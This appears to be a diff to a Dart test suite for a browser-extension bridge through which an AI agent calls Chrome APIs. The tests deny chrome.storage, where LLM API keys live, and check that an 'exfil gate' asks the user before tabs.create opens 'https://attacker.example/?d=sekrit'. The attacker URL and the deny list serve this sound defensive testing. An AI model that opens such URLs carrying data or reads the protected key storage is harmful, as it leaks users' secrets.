@@ -24,7 +24,9 @@ void main() {
     test('valid paths parse to root/ns/method', () {
       expect(parseBridgePath('chrome.tabs.get').method, 'get');
       expect(parseBridgePath('chrome.idle.queryState').root, 'idle');
-      expect(parseBridgePath('chrome.storage.local.get').ns, 'storage.local');
+      // dotted-ns parse shape (storage.local was the canonical example
+      // but storage is now bridge-DENIED — system.cpu is dotted too)
+      expect(parseBridgePath('chrome.system.cpu.getInfo').ns, 'system.cpu');
       expect(parseBridgePath('chrome.system.cpu.getInfo').root, 'system');
     });
 
@@ -62,17 +64,22 @@ void main() {
           throwsA(isA<BridgePathException>()));
     });
 
-    test('management + runtime deny with their own code', () {
-      expect(
-        () => parseBridgePath('chrome.management.uninstall'),
-        throwsA(isA<BridgePathException>().having(
-            (e) => e.code, 'code', 'denied_namespace')),
-      );
-      expect(
-        () => parseBridgePath('chrome.runtime.getBackgroundPage'),
-        throwsA(isA<BridgePathException>().having(
-            (e) => e.code, 'code', 'denied_namespace')),
-      );
+    test('management + runtime + storage deny with their own code', () {
+      for (final path in [
+        'chrome.management.uninstall',
+        'chrome.runtime.getBackgroundPage',
+        // storage: the extension's own faProviders (LLM API keys) and
+        // provider config live there — never raw-bridge-reachable.
+        'chrome.storage.local.get',
+        'chrome.storage.sync.set',
+      ]) {
+        expect(
+          () => parseBridgePath(path),
+          throwsA(isA<BridgePathException>().having(
+              (e) => e.code, 'code', 'denied_namespace')),
+          reason: path,
+        );
+      }
       // nested hops under a denied root deny too
       expect(() => parseBridgePath('chrome.management.uninstallSelf'),
           throwsA(isA<BridgePathException>()));
@@ -461,23 +468,178 @@ void main() {
     });
   });
 
+  group('IT: exfil gate — navigation/download ride the curated gate (M1)',
+      () {
+    test('tabs.create to an unvisited origin asks; deny → data error', () async {
+      final chrome = FakeChrome(clock: () => 1730000000000);
+      final asked = <(String, String)>[];
+      final reg = ToolRegistry();
+      await registerBridgeTools(
+        reg,
+        chrome,
+        visitedOrigins: {'https://visited.example'},
+        exfilAsk: (kind, url, explanation) async {
+          asked.add((kind.name, url));
+          return false; // the user says no
+        },
+      );
+      final text = await callTool(reg, 'browser_api', {
+        'path': 'chrome.tabs.create',
+        'args': [
+          {'url': 'https://attacker.example/?d=sekrit'},
+        ],
+      });
+      final json = jsonDecode(_unwrapped(text)) as Map;
+      expect(json['ok'], false, reason: text);
+      expect((json['error'] as Map)['code'], 'approval_required', reason: text);
+      expect(asked, [
+        ('windowOpen', 'https://attacker.example/?d=sekrit'),
+      ]);
+    });
+
+    test('tabs.create to a visited origin executes without asking', () async {
+      final chrome = FakeChrome(clock: () => 1730000000000);
+      var asks = 0;
+      final reg = ToolRegistry();
+      await registerBridgeTools(
+        reg,
+        chrome,
+        visitedOrigins: {'https://visited.example'},
+        exfilAsk: (kind, url, explanation) async {
+          asks++;
+          return true;
+        },
+      );
+      final text = await callTool(reg, 'browser_api', {
+        'path': 'chrome.tabs.create',
+        'args': [
+          {'url': 'https://visited.example/page'},
+        ],
+      });
+      expect((jsonDecode(_unwrapped(text)) as Map)['ok'], true, reason: text);
+      expect(asks, 0);
+    });
+
+    test('downloads.download to visited passes; windows.create url-list '
+        'asks once per unvisited origin', () async {
+      final chrome = FakeChrome(clock: () => 1730000000000);
+      final asked = <String>[];
+      final reg = ToolRegistry();
+      await registerBridgeTools(
+        reg,
+        chrome,
+        visitedOrigins: {'https://visited.example'},
+        exfilAsk: (kind, url, explanation) async {
+          asked.add(url);
+          return true;
+        },
+      );
+      await callTool(reg, 'browser_api', {
+        'path': 'chrome.downloads.download',
+        'args': [
+          {'url': 'https://visited.example/file.bin'},
+        ],
+      });
+      await callTool(reg, 'browser_api', {
+        'path': 'chrome.windows.create',
+        'args': [
+          {
+            'url': [
+              'https://visited.example/a',
+              'https://unvisited.example/b',
+            ],
+          }
+        ],
+      });
+      expect(asked, ['https://unvisited.example/b']);
+    });
+
+    test('gate unwired (no visitedOrigins) keeps the old behavior', () async {
+      final chrome = FakeChrome(clock: () => 1730000000000);
+      final reg = ToolRegistry();
+      await registerBridgeTools(reg, chrome);
+      final text = await callTool(reg, 'browser_api', {
+        'path': 'chrome.tabs.create',
+        'args': [
+          {'url': 'https://anywhere.example/'},
+        ],
+      });
+      expect((jsonDecode(_unwrapped(text)) as Map)['ok'], true, reason: text);
+    });
+  });
+
   group('IT: injection parity (AC5 tail)', () {
-    test('bridge-path scripting.executeScript records the same script call '
-        'shape as curated inject_js', () async {
+    test('bridge chrome.debugger evaluates like curated cdp_eval — the '
+        'same attach/sendCommand/detach shape', () async {
       final chrome = FakeChrome(clock: () => 1730000000000);
       final tab = await chrome.tabs.create(url: 'https://page.example/');
 
       final curatedReg = ToolRegistry();
       await registerBrowserApiTools(curatedReg, chrome);
-      final curatedTool = curatedReg.lookup('inject_js')!;
-      await curatedTool.execute({
+      final curatedRes = await curatedReg.lookup('cdp_eval')!.execute({
         'tabId': tab.id,
-        'code': 'window.__marker = 7',
-        'world': 'ISOLATED',
+        'expression': 'window.__curated = 7',
       }, null, null);
+      expect(
+          (jsonDecode(curatedRes.content
+              .whereType<TextContent>()
+              .map((t) => t.text)
+              .join()) as Map)['ok'],
+          true);
 
       final reg = ToolRegistry();
-      await registerBridgeTools(reg, chrome);
+      await registerBridgeTools(reg, chrome, riskAsk: (path, tier) async {
+        return true; // debugger is exec-tier: allow the ask
+      });
+      final text = await callTool(reg, 'browser_api', {
+        'path': 'chrome.debugger.attach',
+        'args': [
+          {'tabId': tab.id},
+          '1.3',
+        ],
+      });
+      expect((jsonDecode(_unwrapped(text)) as Map)['ok'], true, reason: text);
+      final evalText = await callTool(reg, 'browser_api', {
+        'path': 'chrome.debugger.sendCommand',
+        'args': [
+          {'tabId': tab.id},
+          'Runtime.evaluate',
+          {'expression': 'window.__bridge = 7', 'returnByValue': true},
+        ],
+      });
+      expect((jsonDecode(_unwrapped(evalText)) as Map)['ok'], true,
+          reason: evalText);
+      final detach = await callTool(reg, 'browser_api', {
+        'path': 'chrome.debugger.detach',
+        'args': [
+ {'tabId': tab.id},
+        ],
+      });
+      expect((jsonDecode(_unwrapped(detach)) as Map)['ok'], true,
+          reason: detach);
+
+      // The parity observable: both paths recorded the SAME CDP
+      // method + expression for the tab (capability parity with
+      // inject_js is the e2e's page-world marker, real Chrome).
+      final cdp = chrome.cdpCalls;
+      expect(cdp, hasLength(2));
+      expect(cdp[0].method, cdp[1].method);
+      expect(cdp[0].tabId, cdp[1].tabId);
+      expect(
+        (cdp[1].params as Map)['expression'],
+        isA<String>().having(
+            (e) => e, 'expression', contains('window.__bridge')),
+      );
+    });
+
+    test('scripting.executeScript string func is a schema error — the '
+        'bridge cannot carry a function over JSON (truthful fake)', () async {
+      final chrome = FakeChrome(clock: () => 1730000000000);
+      final tab = await chrome.tabs.create(url: 'https://page.example/');
+      final reg = ToolRegistry();
+      await registerBridgeTools(reg, chrome, riskAsk: (path, tier) async {
+        return true;
+      });
       final text = await callTool(reg, 'browser_api', {
         'path': 'chrome.scripting.executeScript',
         'args': [
@@ -487,12 +649,10 @@ void main() {
           }
         ],
       });
-      expect((jsonDecode(_unwrapped(text)) as Map)['ok'], true);
-
-      final calls = chrome.scriptCalls;
-      expect(calls, hasLength(2));
-      expect(calls[0].funcSource, calls[1].funcSource);
-      expect(calls[0].tabId, calls[1].tabId);
+      final json = jsonDecode(_unwrapped(text)) as Map;
+      expect(json['ok'], false, reason: text);
+      expect((json['error'] as Map)['code'], 'bad_args');
+      expect(chrome.scriptCalls, isEmpty); // nothing ever executed
     });
 
     test('scripting rides the exec tier (prompts)', () async {
@@ -509,7 +669,7 @@ void main() {
         'args': [
           {
             'target': {'tabId': tab.id},
-            'func': '1',
+            'files': ['content/content.js'],
           }
         ],
       });
@@ -565,5 +725,7 @@ void main() {
 String _unwrapped(String wrapped) {
   final start = wrapped.indexOf('>>\n');
   final end = wrapped.indexOf('\n<<<');
+  // Error envelopes are plain JSON — no quarantine fence to strip.
+  if (start < 0 || end < 0) return wrapped;
   return wrapped.substring(start + 3, end);
 }
